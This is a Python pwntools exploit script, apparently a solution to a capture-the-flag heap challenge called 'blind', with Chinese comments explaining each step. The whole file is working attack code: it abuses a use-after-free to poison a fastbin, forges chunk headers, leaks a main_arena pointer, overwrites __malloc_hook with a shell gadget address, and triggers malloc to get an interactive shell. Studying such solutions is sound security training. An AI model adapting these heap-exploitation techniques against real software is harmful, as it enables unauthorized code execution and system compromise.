from pwn import *

context.log_level = 'debug'
p = process("./blind")

bss_stdout = 0x602020 
ptr_addr = 0x602060
sys_addr = 0x4008E3
def new(idx,content):
	p.recvuntil("Choice:")
	p.sendline("1")
	p.recvuntil("Index:")
	p.sendline(str(idx))
	p.recvuntil("Content:")
	p.send(content)
def change(idx,content):
	p.recvuntil("Choice:")
	p.sendline("2")
	p.recvuntil("Index:")
	p.sendline(str(idx))
	p.recvuntil("Content:")
	p.send(content)
def release(idx):
	p.recvuntil("Choice:")
	p.sendline("3")
	p.recvuntil("Index:")
	p.sendline(str(idx))

if __name__=='__main__': 
	content = 'A'*8+'\n'
	new(0,content)
	new(1,content)
	new(2,content)

	release(0)
	change(0,p64(0x60203d)+'\n')
	new(3,content)
	payload = 'a'*3+p64(0x0)+p64(0x101)+p64(0x602060)+p64(0x602150)+p64(0x602060)+'\n'
	new(4,payload) # 伪造堆块大小为0x101------chunk0-------chunk1--------chunk2
	change(1,p64(0)+p64(0x21)+p64(0)*3+p64(0x21)+'\n') #释放堆块时要绕过检验，下两个堆块的size的in_use位要为1，只是一个堆块为1，释放后无法确认该堆块是否in_use，是否要合并，所以会产生报错
	release(0) #释放，得到unsorted bin,得到main_arena+88的地址在0x602060上
	change(2,'\n')#程序会将'\n'变为'\x00'，使得堆块正好分配在_malloc_hook-0x10上，0x78->0x00,main_arena+88-0x78=main_arena-0x20=_malloc_hook-0x10

	change(0,p64(0)*2+p64(sys_addr)+'\n') #修改_malloc_hook地址为system地址
	
	p.recvuntil("Choice:") #触发malloc，得到shell
	p.sendline("1")
	p.recvuntil("Index:")
	p.sendline("5")
	p.interactive()
